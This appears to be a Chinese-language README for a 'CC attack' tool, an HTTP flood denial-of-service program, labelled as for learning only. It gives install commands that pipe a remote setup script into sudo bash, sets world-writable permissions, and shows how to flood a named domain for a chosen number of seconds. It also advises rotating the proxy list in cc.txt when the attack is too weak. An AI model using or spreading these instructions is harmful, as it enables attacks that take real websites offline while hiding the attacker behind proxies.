# 本程序为CC攻击程序，仅供用于学习，请勿用于违法违规用途

**作者用的CentOS开发的，不清楚Ubuntu和Debian是否能正常使用**

**1.安装必要运行环境**

***Debian\Ubuntu***

```bash
apt install sudo bash wget curl -y && curl --silent --location https://rpm.nodesource.com/setup_10.x | sudo bash - && apt install nodejs -y
```

***CentOS***
```bash
yum install sudo bash wget curl -y && curl --silent --location https://rpm.nodesource.com/setup_10.x | sudo bash - && yum install nodejs -y
```

**2.给程序的三个文件777权限**
```bash
chmod 777 cc && chmod 777 cc.txt && chmod 777 cc-mod.js
```

**3.执行程序**
```bash
./cc 域名 时长
```

例如`./cc http://zxbke.cn 60`为cc http://zxbke.cn 60秒，如网址采用了`https`可将`http`请求头替换为`https`请求头

**程序作者的题外话**

代理ip地址默认在cc.txt中，脚本默认调用cc.txt，需要修改请直接修改cc.txt中的内容

如果攻击效果不明显，请更换代理ip（即cc.txt）